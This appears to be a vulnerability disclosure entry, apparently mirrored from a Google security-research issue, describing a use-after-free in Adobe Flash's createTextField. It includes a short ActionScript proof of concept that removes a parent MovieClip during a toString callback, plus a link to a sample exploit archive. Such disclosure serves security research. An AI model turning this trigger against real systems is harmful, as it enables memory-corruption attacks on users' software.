@@ -1,0 +1,25 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=408&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+There is a use-after-free in CreateTextField. If a flash file contains a MovieClip heirarcy, such as:
+
+_root-->l1-->l2-->l3
+
+If createTextField is called on l2 to create l3, and the call makes a call into a function the deletes l2 or l1, a use-after-free occurs. A POC is as follows:
+
+var l1 = this.createEmptyMovieClip("l1", 1);
+var l2 = l1.createEmptyMovieClip("l2", 1);
+ns = {toString: strfunc, valueOf: strfunc};
+var l3 = l2.createTextField(ns, 1, 0, 0, 10, 10);
+
+function strfunc(){
+	
+	l2.removeMovieClip();
+	return "myname";
+	
+	}
+
+A sample SWF and fla are attached.
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37873.zip
+
